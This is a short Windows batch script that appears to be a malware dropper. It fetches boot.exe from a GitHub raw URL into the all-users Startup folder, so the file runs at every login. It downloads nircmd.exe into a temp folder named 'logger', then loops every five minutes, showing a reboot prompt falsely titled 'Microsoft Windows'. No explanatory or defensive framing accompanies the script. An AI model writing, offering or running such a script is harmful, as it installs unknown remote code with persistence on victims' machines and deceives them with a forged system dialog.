@echo off
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/boot.exe -OutFile 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\boot.exe'
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/nircmd.exe -OutFile %temp%\logger\nircmd.exe
:rebootpls
timeout 300
%temp%\logger\nircmd.exe qboxcom "Do you want to reboot? Make sure you save everything you have open. (This prompt will disappear after reboot.)" "Microsoft Windows" exitwin reboot
goto rebootpls
